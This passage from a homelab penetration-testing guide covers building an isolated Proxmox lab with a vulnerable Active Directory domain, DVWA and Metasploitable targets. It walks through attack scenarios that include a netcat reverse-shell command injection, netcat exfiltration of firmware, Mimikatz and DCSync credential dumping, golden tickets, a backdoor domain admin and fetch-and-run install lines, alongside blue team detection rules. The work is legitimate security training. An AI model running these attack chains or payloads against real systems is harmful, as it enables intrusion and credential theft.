[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

# Install attacker tools
choco install -y mimikatz rubeus sharphound bloodhound \
    powershell-core python3 git vscode \
    sysinternals processhacker

# PowerShell offensive modules
Install-Module -Name PowerSploit -Force
Install-Module -Name Nishang -Force
Install-Module -Name Empire -Force
```

### Target VMs

#### Windows Active Directory Lab

**Domain Controller (DC01)**:
```bash
# Create Windows Server 2019 VM
qm create 300 --name dc01-target --memory 16384 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=30 \
    --cdrom local:iso/WinServer2019_Eval.iso \
    --scsi0 local-lvm:80 --scsihw virtio-scsi-pci \
    --ostype win10

qm start 300
```

**Post-Installation** (via RDP from Management VLAN):
```powershell
# Set static IP
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.30.30.10 -PrefixLength 24 -DefaultGateway 10.30.30.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.30.30.10

# Rename computer
Rename-Computer -NewName "DC01" -Restart

# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to domain controller
Install-ADDSForest -DomainName "pnwlab.local" -DomainNetbiosName "PNWLAB" `
    -ForestMode "WinThreshold" -DomainMode "WinThreshold" `
    -InstallDns -Force

# Create vulnerable AD configuration (for testing)
# Add users with weak passwords
New-ADUser -Name "John Doe" -SamAccountName "jdoe" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "Admin User" -SamAccountName "admin" -AccountPassword (ConvertTo-SecureString "Admin@123" -AsPlainText -Force) -Enabled $true -MemberOf "Domain Admins"

# Enable legacy authentication protocols (for practice)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Value 1

# Disable Windows Defender (for exploitation practice)
Set-MpPreference -DisableRealtimeMonitoring $true
```

**SQL Server (SQL01)**:
```bash
qm create 301 --name sql01-target --memory 16384 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=30 \
    --cdrom local:iso/SQLServer2019_Eval.iso \
    --scsi0 local-lvm:120 --scsihw virtio-scsi-pci

# Join to domain, install SQL Server with sa account
# Enable xp_cmdshell for exploitation practice
```

**Windows Workstations (WKS01-05)**:
```bash
# Create template
qm create 310 --name wks-template --memory 4096 --cores 2 \
    --net0 virtio,bridge=vmbr1,tag=30 \
    --cdrom local:iso/Win11_23H2_English_x64.iso \
    --scsi0 local-lvm:60 --scsihw virtio-scsi-pci

# Install Windows 11, join to domain
# Clone template 5 times
qm clone 310 311 --name wks01
qm clone 310 312 --name wks02
# ... etc

# Configure different privilege levels:
# WKS01: Domain Admin sometimes logs in (for Mimikatz practice)
# WKS02-05: Standard users
```

#### Linux Vulnerable Targets

**Metasploitable 2**:
```bash
# Download and import
cd /var/lib/vz/template/iso/
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
unzip metasploitable-linux-2.0.0.zip

qm create 320 --name metasploitable2 --memory 2048 --cores 1 \
    --net0 virtio,bridge=vmbr1,tag=30
qm importdisk 320 Metasploitable.vmdk local-lvm
qm set 320 --scsi0 local-lvm:vm-320-disk-0
qm set 320 --boot order=scsi0

# Configure static IP: 10.30.30.70
# Credentials: msfadmin / msfadmin
```

**Metasploitable 3**:
```bash
# Deploy using Vagrant on a Linux VM or build manually
# https://github.com/rapid7/metasploitable3
# Import resulting VM to Proxmox
# IP: 10.30.30.71
```

**DVWA (Damn Vulnerable Web Application)**:
```bash
qm create 322 --name dvwa-ubuntu --memory 4096 --cores 2 \
    --net0 virtio,bridge=vmbr1,tag=30 \
    --cdrom local:iso/ubuntu-22.04-server.iso \
    --scsi0 local-lvm:40

# Install Ubuntu Server, configure static IP 10.30.30.72
# Install DVWA:
sudo apt update && sudo apt install -y apache2 mariadb-server php php-mysqli php-gd git
sudo git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa
# Configure database, set security to low/medium
```

**OWASP Broken Web Apps VM**:
```bash
# Download OVA
wget https://sourceforge.net/projects/owaspbwa/files/latest/download -O owaspbwa.ova

# Convert and import
qm importovf 323 owaspbwa.ova local-lvm
qm set 323 --name owasp-bwa --net0 virtio,bridge=vmbr1,tag=30
# IP: 10.30.30.73
```

#### HackTheBox-Style Custom Targets

**Option 1**: Download retired HTB machines (with VIP subscription)
**Option 2**: Build custom vulnerable VMs based on CTF writeups
**Option 3**: Use VulnHub VMs

```bash
# Example: Deploy VulnHub Mr. Robot VM
cd /var/lib/vz/template/iso/
wget https://download.vulnhub.com/mrrobot/mrRobot.ova

qm importovf 330 mrRobot.ova local-lvm
qm set 330 --name htb-mrrobot --net0 virtio,bridge=vmbr1,tag=30
# IPs: 10.30.30.80-90 for custom targets
```

---

## Advanced Lab Scenarios

### Scenario 1: Active Directory Pentesting

**Objective**: Compromise PNWLAB.local domain from external network position

**Starting Point**: Kali VM on Attack VLAN, no credentials

**Attack Chain**:
1. **Network Reconnaissance**:
   ```bash
   nmap -sn 10.30.30.0/24
   nmap -sC -sV -p- 10.30.30.10  # DC scan
   nmap -p 445,139,389,88 10.30.30.0/24  # AD service scan
   ```

2. **SMB Enumeration**:
   ```bash
   enum4linux -a 10.30.30.10
   smbclient -L //10.30.30.10 -N
   crackmapexec smb 10.30.30.0/24 --shares
   ```

3. **LLMNR/NBT-NS Poisoning**:
   ```bash
   sudo responder -I eth0 -wv
   # Wait for captured NTLMv2 hash
   ```

4. **Password Cracking**:
   ```bash
   # Copy hash to ZimaBoard2 with RTX 3050
   scp captured.hash user@10.20.20.50:~/
   
   # On ZimaBoard2 with GPU:
   hashcat -m 5600 captured.hash /mnt/pentest-data/wordlists/rockyou.txt
   ```

5. **Initial Access**:
   ```bash
   crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --shares
   crackmapexec winrm 10.30.30.0/24 -u jdoe -p 'Password123!'
   evil-winrm -i 10.30.30.20 -u jdoe -p 'Password123!'
   ```

6. **Privilege Escalation**:
   ```powershell
   # Upload PowerUp
   upload /opt/PowerUp/PowerUp.ps1
   . .\PowerUp.ps1
   Invoke-AllChecks
   
   # Or use Bloodhound
   upload /opt/SharpHound.ps1
   . .\SharpHound.ps1
   Invoke-BloodHound -CollectionMethod All
   ```

7. **Lateral Movement**:
   ```bash
   crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --local-auth
   crackmapexec smb 10.30.30.0/24 -u jdoe -H <ntlm-hash> --lsa
   ```

8. **Domain Admin Compromise**:
   ```bash
   # Mimikatz on WKS01 (where DA logged in)
   crackmapexec smb 10.30.30.20 -u jdoe -p 'Password123!' -M mimikatz
   
   # DCSync attack
   secretsdump.py 'PNWLAB/admin:Admin@123@10.30.30.10'
   ```

9. **Persistence**:
   ```bash
   # Golden ticket
   ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-sid> -domain pnwlab.local adminuser
   
   # Or create backdoor user
   net user hacker P@ssw0rd123 /add /domain
   net group "Domain Admins" hacker /add /domain
   ```

**Blue Team Detection**: 
- Security Onion should alert on Responder traffic
- Splunk should flag failed authentication attempts
- Wazuh agents should detect Mimikatz execution
- OPNsense IDS should trigger on DCSync traffic

### Scenario 2: External Penetration Test (Web App Focus)

**Objective**: Compromise DVWA web application and pivot to internal network

**Target**: 10.30.30.72 (DVWA)

**Attack Chain**:
1. **Web Reconnaissance**:
   ```bash
   nmap -sV -p 80,443,8080 10.30.30.72
   nikto -h http://10.30.30.72/dvwa
   whatweb http://10.30.30.72/dvwa
   ```

2. **Directory Enumeration**:
   ```bash
   gobuster dir -u http://10.30.30.72/dvwa -w /mnt/pentest-data/wordlists/common.txt
   ffuf -u http://10.30.30.72/dvwa/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
   ```

3. **Vulnerability Scanning**:
   ```bash
   nuclei -u http://10.30.30.72/dvwa -t /opt/nuclei-templates/
   ```

4. **Manual Testing with Burp Suite**:
   - SQL Injection
   - Command Injection
   - File Upload vulnerabilities
   - XSS

5. **SQL Injection Exploitation**:
   ```bash
   sqlmap -u "http://10.30.30.72/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<session>; security=low" \
       --dbs --batch
   
   # Extract credentials
   sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
   ```

6. **Remote Code Execution**:
   ```bash
   # Command injection
   ; nc -e /bin/bash 10.20.20.10 4444
   
   # Or file upload webshell
   # Upload PHP reverse shell
   ```

7. **Post-Exploitation**:
   ```bash
   # Upgrade shell
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   
   # Enumerate system
   sudo -l
   cat /etc/passwd
   find / -perm -4000 2>/dev/null  # SUID binaries
   
   # Pivot to internal network
   ip route
   for i in {1..254}; do ping -c 1 10.30.30.$i & done
   ```

8. **Credential Harvesting**:
   ```bash
   cat /var/www/html/dvwa/config/config.inc.php  # DB credentials
   grep -r "password" /var/www/ 2>/dev/null
   ```

9. **Lateral Movement**:
   ```bash
   # Try reused credentials on SMB/SSH
   crackmapexec ssh 10.30.30.0/24 -u dvwa_user -p 'found_password'
   ```

**Blue Team Detection**:
- Nikto/Nuclei scanners should trigger WAF alerts (if deployed)
- SQLMap traffic should be detected by IDS
- Reverse shell connection should alert on egress firewall
- Wazuh should detect file modification (webshell upload)

### Scenario 3: Ransomware Simulation (Isolated VLAN Only)

**CRITICAL**: This is performed in **VLAN 99 - Fully Isolated** network ONLY

**Objective**: Safely test ransomware behavior for blue team training

**Setup**:
```bash
# Create isolated Windows targets in VLAN 99
qm clone 310 400 --name ransomware-target-01
qm set 400 --net0 virtio,bridge=vmbr1,tag=99
# Repeat for 3-5 targets
```

**Red Team**:
1. Deploy simulated ransomware (Python/PowerShell script that encrypts files but keeps decryption key)
2. Test initial access vectors: phishing simulation, RDP brute force
3. Execute payload, monitor encryption process
4. Test C2 communication (note: no real internet, use local C2 server in VLAN 99)

**Blue Team**:
1. Monitor with EDR agents (Wazuh, OSSEC)
2. Detect:
   - Unusual file access patterns
   - Mass file modifications
   - Shadow copy deletion
   - C2 beaconing
3. Practice incident response:
   - Isolate infected hosts
   - Analyze malware samples
   - Recover from backups
   - Hunt for lateral movement

**Tools**:
```bash
# Red Team: Ransomware simulator
python3 /opt/custom/ransim.py --target 10.99.99.0/24 --encrypt-only

# Blue Team: Monitoring
tail -f /var/log/wazuh/alerts.log | grep -i "ransomware\|file_integrity"
```

### Scenario 4: IoT/Embedded Device Exploitation

**Objective**: Compromise ZimaBoard target and extract firmware

**Target**: ZimaBoard configured as IoT device (IP: 10.30.30.140)

**Setup on ZimaBoard**:
- Install minimal Linux (Debian/Ubuntu)
- Intentionally misconfigure SSH (weak password)
- Run vulnerable web service (e.g., old version of lighttpd)
- Enable UART/serial for hardware access

**Attack Chain**:
1. **Network Discovery**:
   ```bash
   nmap -sV -p- 10.30.30.140
   nmap --script vuln 10.30.30.140
   ```

2. **Web Exploitation**:
   ```bash
   # Scan for CVEs in web server
   searchsploit lighttpd
   
   # Exploit vulnerable service
   msfconsole
   use exploit/linux/http/lighttpd_...
   set RHOST 10.30.30.140
   exploit
   ```

3. **SSH Brute Force** (if web exploitation fails):
   ```bash
   hydra -l root -P /mnt/pentest-data/wordlists/common-passwords.txt ssh://10.30.30.140
   ```

4. **Post-Exploitation**:
   ```bash
   # Dump firmware
   dd if=/dev/mmcblk0 of=/tmp/firmware.img bs=1M
   
   # Exfiltrate
   nc 10.20.20.10 4444 < /tmp/firmware.img
   ```

5. **Firmware Analysis** (on Kali):
   ```bash
   binwalk -e firmware.img
   strings firmware.img | grep -i password
   firmware-mod-kit/extract-firmware.sh firmware.img
   ```

6. **Hardware Hacking** (Physical Access):
   - Connect to UART pins
   - Use Bus Pirate or similar to access serial console
   ```bash
   screen /dev/ttyUSB0 115200
   # Interrupt boot, gain root shell
   ```

**Blue Team Detection**:
- NetAlertX should detect new device on network
- OPNsense should log brute force attempts
- Security Onion should flag exploitation traffic
- Host-based detection if Wazuh agent installed on IoT device

### Scenario 5: Red Team vs. Blue Team Exercise

**Format**: Live purple teaming exercise

**Red Team Objective**: Achieve domain admin within 4 hours
**Blue Team Objective**: Detect and contain attack before DA compromise

**Setup**:
- Red Team: Kali VM (Attack VLAN)
- Blue Team: Security Onion, Splunk dashboards (Blue Team VLAN)
- Targets: Full AD environment (Target VLAN)

**Rules of Engagement**:
1. Red Team must document all commands
2. Blue Team documents all detections
3. Communication channel for "pause" during detection discussion
4. Debrief after exercise to improve both sides

**Red Team Kill Chain**:
```
Reconnaissance → Initial Access → Privilege Escalation → 
Lateral Movement → Domain Dominance → Persistence
```

**Blue Team Detection Points**:
1. Initial scan detection (Suricata)
2. Responder/LLMNR poisoning (network anomaly)
3. Failed authentication attempts (Windows logs)
4. PowerShell Empire/Cobalt Strike beacons (EDR)
5. Mimikatz execution (YARA rules, process monitoring)
6. DCSync traffic (abnormal replication)

**Scoring**:
- Red Team: Points for each phase achieved undetected
- Blue Team: Points for each detection + containment action

**Post-Exercise Analysis**:
- Review all logs in Splunk
- Map to MITRE ATT&CK framework
- Improve detection rules
- Identify gaps in monitoring

---

## Tool Arsenal Integration

### Essential Pentest Tools (Pre-Configured)

#### Reconnaissance & OSINT

**Tools Available** (from ULTIMATE-CYBERSECURITY-MASTER-GUIDE):
- theHarvester
- Recon-ng
- SpiderFoot
- Maltego
- Amass
- Subfinder
- Assetfinder
- Shodan CLI
- Censys CLI

**NFS Mount for Centralized Tools**:
```bash
# On all attacker VMs
sudo mkdir /mnt/pentest-data
sudo mount -t nfs truenas-ip:/mnt/tank/pentest-data /mnt/pentest-data

# Tools accessible at:
# /mnt/pentest-data/tools/
```

**Custom OSINT VM** (Optional, using your OSINT Arsenal):
```bash
qm create 210 --name osint-vm --memory 8192 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=20 \
    --cdrom local:iso/ubuntu-22.04-desktop.iso \
    --scsi0 local-lvm:80

# Install all 400+ OSINT tools from your guide
# Use automated scripts from your repository
```

#### Scanning & Enumeration

**Nmap with Custom Scripts**:
```bash
# NSE scripts location
/usr/share/nmap/scripts/

# Add custom scripts from your guide
sudo cp /mnt/pentest-data/tools/nmap-custom/*.nse /usr/share/nmap/scripts/
sudo nmap --script-updatedb
```

**Masscan for Fast Scanning**:
```bash
# Scan entire target network in seconds
sudo masscan -p1-65535 10.30.30.0/24 --rate=10000 -oL scan.txt
```

**RustScan**:
```bash
rustscan -a 10.30.30.0/24 -- -sC -sV
```

**OpenVAS/Greenbone** (Deploy on Blue Team VLAN for vulnerability scanning):
```bash
qm create 411 --name openvas --memory 8192 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=40 \
    --cdrom local:iso/gsm-ce-latest.iso \
    --scsi0 local-lvm:80

# Access via https://10.40.40.20:9392
```

#### Exploitation Frameworks

**Metasploit Framework**:
```bash
# Already installed on Kali
# Initialize database
sudo msfdb init

# Custom modules from your guide
mkdir -p ~/.msf4/modules/exploits/custom
cp /mnt/pentest-data/exploits/*.rb ~/.msf4/modules/exploits/custom/
```

**Cobalt Strike** (Licensed):
- Team server on dedicated VM in Attack VLAN
- Clients on attacker VMs
```bash
# Start team server
./teamserver 10.20.20.100 P@ssw0rd! /path/to/profile.profile

# Connect client
./cobaltstrike
# Host: 10.20.20.100, Password: P@ssw0rd!
```

**Sliver C2** (Open Source Alternative):
```bash
# Install on Kali
curl https://sliver.sh/install | sudo bash

# Start Sliver server
sliver-server

# Generate implant
generate --http 10.20.20.10:80 --os windows --arch amd64 --save /tmp/payload.exe
```

**Empire/Starkiller**:
```bash
# Install Empire
git clone https://github.com/BC-SECURITY/Empire.git /opt/Empire
cd /opt/Empire
sudo ./setup/install.sh

# Install Starkiller (GUI)
wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.11.0/starkiller-1.11.0.AppImage
chmod +x starkiller-1.11.0.AppImage
./starkiller-1.11.0.AppImage
```

#### Web Application Testing

**Burp Suite Professional** (if licensed):
```bash
# Download and install
# Configure proxy: 127.0.0.1:8080
# Import custom extensions
```

**OWASP ZAP**:
```bash
# Already on Kali
# Launch with API enabled for automation
zaproxy -daemon -port 8090 -config api.key=mysecretapikey
```

**SQLMap**:
```bash
# Automated SQL injection
sqlmap -u "http://10.30.30.72/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=xxx; security=low" \
    --level=5 --risk=3 --batch --dbs
```

**Nuclei**:
```bash
# Fast vulnerability scanner
nuclei -u http://10.30.30.72 -t /opt/nuclei-templates/ -severity critical,high
```

**WFuzz**:
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt \
    --hc 404 http://10.30.30.72/FUZZ
```

#### Active Directory Tools

**BloodHound**:
```bash
# Neo4j database
sudo apt install neo4j
sudo neo4j console

# BloodHound GUI
cd /opt/BloodHound
npm start

# SharpHound collector (run on Windows target)
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp
```

**CrackMapExec**:
```bash
crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --shares
crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --sam
crackmapexec smb 10.30.30.0/24 -u jdoe -H <ntlm> --lsa
```

**Impacket Suite**:
```bash
# GetNPUsers (ASREPRoast)
GetNPUsers.py PNWLAB/ -usersfile users.txt -dc-ip 10.30.30.10

# Secretsdump (DCSync)
secretsdump.py PNWLAB/admin:password@10.30.30.10

# PSExec
psexec.py PNWLAB/admin:password@10.30.30.20
```

**Mimikatz** (on Windows attacker VM):
```powershell
# Download and run
Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -OutFile mimikatz.zip
Expand-Archive mimikatz.zip
cd mimikatz\x64
.\mimikatz.exe

# Extract credentials
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /user:Administrator
```

#### Password Cracking (GPU-Accelerated)

**Hashcat on ZimaBoard2 with RTX 3050**:

**Setup**:
```bash
# Install CUDA drivers
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/cuda-ubuntu2204.pin
sudo mv cuda-ubuntu2204.pin /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/12.3.0/local_installers/cuda-repo-ubuntu2204-12-3-local_12.3.0-545.23.06-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu2204-12-3-local_12.3.0-545.23.06-1_amd64.deb
sudo cp /var/cuda-repo-ubuntu2204-12-3-local/cuda-*-keyring.gpg /usr/share/keyrings/
sudo apt-get update
sudo apt-get -y install cuda

# Install Hashcat
sudo apt install hashcat

# Verify GPU
hashcat -I
```

**Cracking Examples**:
```bash
# NTLMv2 hash
hashcat -m 5600 -a 0 ntlmv2.hash /mnt/pentest-data/wordlists/rockyou.txt

# NTLM hash
hashcat -m 1000 -a 0 ntlm.hash /mnt/pentest-data/wordlists/rockyou.txt

# WPA2 handshake
hashcat -m 22000 -a 0 handshake.hc22000 /mnt/pentest-data/wordlists/rockyou.txt

# Benchmark GPU
hashcat -b
```

**Performance**: RTX 3050 should achieve:
- NTLM: ~15-20 GH/s
- WPA2: ~300-500 kH/s
- bcrypt: ~10-15 kH/s

**John the Ripper**:
```bash
# Extract hashes from shadow file
sudo unshadow /etc/passwd /etc/shadow > hashes.txt

# Crack with JtR
john --wordlist=/mnt/pentest-data/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

#### Wireless Hacking

**Hardware**: Use USB WiFi adapter with monitor mode support
- Alfa AWUS036ACH (recommended from your guide)
- TP-Link TL-WN722N

**Aircrack-ng Suite**:
```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack to force handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack with aircrack-ng
aircrack-ng -w /mnt/pentest-data/wordlists/rockyou.txt capture-01.cap

# Or transfer to GPU for faster cracking
cap2hashcat capture-01.cap -o handshake.hc22000
# Copy to ZimaBoard2 for Hashcat
```

**Bettercap**:
```bash
# MitM attacks
sudo bettercap -iface eth0
> net.probe on
> net.show
> set http.proxy.sslstrip true
> http.proxy on
> net.sniff on
```

**Wifite2** (Automated):
```bash
sudo wifite --kill
```

#### Post-Exploitation

**LinPEAS / WinPEAS**:
```bash
# Linux privilege escalation enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Windows (PowerShell)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
```

**PowerSploit / PowerUp**:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

**Ligolo-ng** (Pivoting):
```bash
# Proxy server on attacker
./proxy -selfcert

# Agent on compromised host
./agent -connect 10.20.20.10:11601 -ignore-cert

# Create tunnel
session
ifconfig
start
# Add route to pivot network
sudo ip route add 172.16.0.0/16 dev ligolo
```

#### Reverse Engineering

**Ghidra** (on Kali with GUI):
```bash
# Launch Ghidra
ghidraRun

# Import binary for analysis
# Use for malware analysis, exploit development
```

**Radare2**:
```bash
r2 /path/to/binary
# Analyze
> aaa
# Disassemble main
> pdf @ main
```

**x64dbg** (on Windows attacker VM):
- Download from https://x64dbg.com/
- Use for Windows binary debugging

---

## Automation & Infrastructure as Code

### Vagrant Lab Automation

**Benefits**:
- Reproducible builds
- Version-controlled infrastructure
- Rapid deployment

**Vagrantfile Example** (Target VMs):
```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  # Metasploitable 2
  config.vm.define "metasploitable2" do |ms2|
    ms2.vm.box = "rapid7/metasploitable-linux"
    ms2.vm.network "private_network", ip: "10.30.30.70"
    ms2.vm.provider "virtualbox" do |vb|
      vb.memory = "2048"
      vb.cpus = 1
    end
  end

  # DVWA Ubuntu
  config.vm.define "dvwa" do |dvwa|
    dvwa.vm.box = "ubuntu/jammy64"
    dvwa.vm.network "private_network", ip: "10.30.30.72"
    dvwa.vm.provider "virtualbox" do |vb|
      vb.memory = "4096"
      vb.cpus = 2
    end
    dvwa.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y apache2 mariadb-server php php-mysqli php-gd git
      git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
      chown -R www-data:www-data /var/www/html/dvwa
      # ... additional DVWA setup
    SHELL
  end

  # Windows Server 2019 (requires licensed box)
  config.vm.define "dc01" do |dc|
    dc.vm.box = "gusztavvargadr/windows-server"
    dc.vm.network "private_network", ip: "10.30.30.10"
    dc.vm.provider "virtualbox" do |vb|
      vb.memory = "4096"
      vb.cpus = 2
    end
    dc.vm.provision "shell", path: "scripts/setup-dc.ps1"
  end
end
```

**Usage**:
```bash
# Deploy entire lab
vagrant up

# Destroy and rebuild
vagrant destroy -f && vagrant up

# Snapshot state
vagrant snapshot save baseline
```

### Terraform with Proxmox Provider

**Install Terraform**:
```bash
wget https://releases.hashicorp.com/terraform/1.6.3/terraform_1.6.3_linux_amd64.zip
unzip terraform_1.6.3_linux_amd64.zip
sudo mv terraform /usr/local/bin/
```

**Terraform Configuration** (`main.tf`):
```hcl
terraform {
  required_providers {
    proxmox = {
      source  = "Telmate/proxmox"
      version = "2.9.14"
    }
  }
}

provider "proxmox" {
  pm_api_url      = "https://10.10.10.5:8006/api2/json"
  pm_user         = "root@pam"
  pm_password     = "your-password"
  pm_tls_insecure = true
}

# Kali Linux attacker
resource "proxmox_vm_qemu" "kali" {
  name        = "kali-primary"
  target_node = "pve-node1"
  clone       = "kali-template"
  cores       = 6
  memory      = 16384
  
  network {
    bridge = "vmbr1"
    model  = "virtio"
    tag    = 20
  }
  
  disk {
    storage = "local-lvm"
    size    = "40G"
    type    = "scsi"
  }
  
  ipconfig0 = "ip=10.20.20.10/24,gw=10.20.20.1"
}

# Metasploitable 2 target
resource "proxmox_vm_qemu" "metasploitable2" {
  name        = "metasploitable2"
  target_node = "pve-node1"
  clone       = "metasploitable2-template"
  cores       = 1
  memory      = 2048
  
  network {
    bridge = "vmbr1"
    model  = "virtio"
    tag    = 30
  }
  
  disk {
    storage = "local-lvm"
    size    = "10G"
    type    = "scsi"
  }
  
  ipconfig0 = "ip=10.30.30.70/24,gw=10.30.30.1"
}

# Repeat for all VMs...
```

**Deploy Lab**:
```bash
terraform init
terraform plan
terraform apply

# Destroy lab
terraform destroy
```

### Ansible Playbooks for Configuration

**Inventory** (`inventory.ini`):
```ini
[attackers]
kali ansible_host=10.20.20.10 ansible_user=kali ansible_password=kali

[targets]
dvwa ansible_host=10.30.30.72 ansible_user=ubuntu ansible_ssh_private_key_file=~/.ssh/id_rsa
metasploitable2 ansible_host=10.30.30.70 ansible_user=msfadmin ansible_password=msfadmin

[blueteam]
security-onion ansible_host=10.40.40.10 ansible_user=admin ansible_ssh_private_key_file=~/.ssh/id_rsa
```

**Playbook** (`setup-lab.yml`):
```yaml
---
- name: Configure Kali attacker
  hosts: attackers
  become: yes
  tasks:
    - name: Update system
      apt:
        update_cache: yes
        upgrade: full
    
    - name: Install additional tools
      apt:
        name:
          - bloodhound
          - crackmapexec
          - evil-winrm
          - pipx
        state: present
    
    - name: Mount NFS share
      mount:
        path: /mnt/pentest-data
        src: "truenas-ip:/mnt/tank/pentest-data"
        fstype: nfs
        state: mounted

- name: Deploy vulnerable DVWA
  hosts: dvwa
  become: yes
  tasks:
    - name: Install LAMP stack
      apt:
        name:
          - apache2
          - mariadb-server
          - php
          - php-mysqli
          - php-gd
          - git
        state: present
    
    - name: Clone DVWA
      git:
        repo: https://github.com/digininja/DVWA.git
        dest: /var/www/html/dvwa
    
    - name: Set permissions
      file:
        path: /var/www/html/dvwa
        owner: www-data
        group: www-data
        recurse: yes
    
    - name: Configure MySQL
      mysql_db:
        name: dvwa
        state: present
      # ... additional MySQL setup

- name: Configure Blue Team monitoring
  hosts: blueteam
  become: yes
  tasks:
    - name: Configure log forwarding
      template:
        src: templates/rsyslog.conf.j2
        dest: /etc/rsyslog.d/remote.conf
      notify: restart rsyslog
  
  handlers:
    - name: restart rsyslog
      service:
        name: rsyslog
        state: restarted
```

**Run Playbook**:
```bash
ansible-playbook -i inventory.ini setup-lab.yml
```

### Automated Lab Reset Script

**Create Bash Script** (`reset-lab.sh`):
```bash
#!/bin/bash
# Automated lab reset script

echo "Resetting PNW Pentest Lab..."

# Revert all VMs to baseline snapshot
VMS=(200 201 202 300 301 310 311 312 320 322 323)

for vm in "${VMS[@]}"; do
    echo "Reverting VM $vm to baseline snapshot..."
    qm rollback $vm baseline
done

# Restart VMs
for vm in "${VMS[@]}"; do
    echo "Starting VM $vm..."
    qm start $vm
done

# Clear logs on blue team systems
ssh admin@10.40.40.10 "sudo truncate -s 0 /var/log/suricata/eve.json"
ssh admin@10.40.40.11 "docker exec splunk /opt/splunk/bin/splunk clean eventdata -f"

# Reset OPNsense firewall rules to default
# ... add OPNsense API calls if needed

echo "Lab reset complete!"
```

**Make Executable and Schedule**:
```bash
chmod +x reset-lab.sh

# Add to crontab for nightly reset
crontab -e
# Add: 0 2 * * * /path/to/reset-lab.sh
```

---

## Monitoring & Blue Team Integration

### Security Onion Deployment

**Installation**:
```bash
qm create 410 --name security-onion --memory 16384 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=40 \
    --cdrom local:iso/securityonion-2.4.10.iso \
    --scsi0 local-lvm:200 --scsihw virtio-scsi-pci

qm start 410
```

**Post-Installation Configuration**:
1. Access console, complete setup wizard
2. Choose **Standalone** deployment
3. Configure management interface: 10.40.40.10/24
4. Enable Suricata IDS
5. Enable Zeek network analysis
6. Configure Elasticsearch for log storage

**SPAN/Mirror Port Configuration on OPNsense**:
```
# In OPNsense web UI:
Interfaces → Diagnostics → Packet Capture
- Enable promiscuous mode on monitor interface
- Forward copy of traffic from VLAN 20, 30 to Security Onion

# Or via pfSense port mirror:
Interfaces → Assignments → Bridges
- Create bridge between monitored interface and Security Onion interface
```

**Alert Rules**:
```bash
# Custom Suricata rules for pentest lab
sudo nano /etc/suricata/rules/local.rules

# Add detection rules
alert tcp any any -> any any (msg:"NMAP SYN Scan Detected"; flags:S; threshold:type both,track by_src,count 10,seconds 5; sid:1000001;)
alert tcp any any -> any any (msg:"Metasploit Payload Detected"; content:"|6d 65 74 65 72 70 72 65 74 65 72|"; sid:1000002;)
alert http any any -> any any (msg:"SQLMap Detected"; content:"User-Agent|3a 20|sqlmap"; sid:1000003;)
alert tcp any any -> any 445 (msg:"SMB Brute Force Attempt"; flags:S; threshold:type both,track by_src,count 5,seconds 60; sid:1000004;)

# Restart Suricata
sudo systemctl restart suricata
```

**Kibana Dashboard Access**: https://10.40.40.10

### Splunk Free Deployment

**Installation**:
```bash
qm create 411 --name splunk --memory 8192 --cores 2 \
    --net0 virtio,bridge=vmbr1,tag=40 \
    --cdrom local:iso/ubuntu-22.04-server.iso \
    --scsi0 local-lvm:100

# Install Ubuntu, then Splunk
wget -O splunk.deb 'https://download.splunk.com/products/splunk/releases/9.1.2/linux/splunk-9.1.2-b6436b649711-linux-2.6-amd64.deb'
sudo dpkg -i splunk.deb
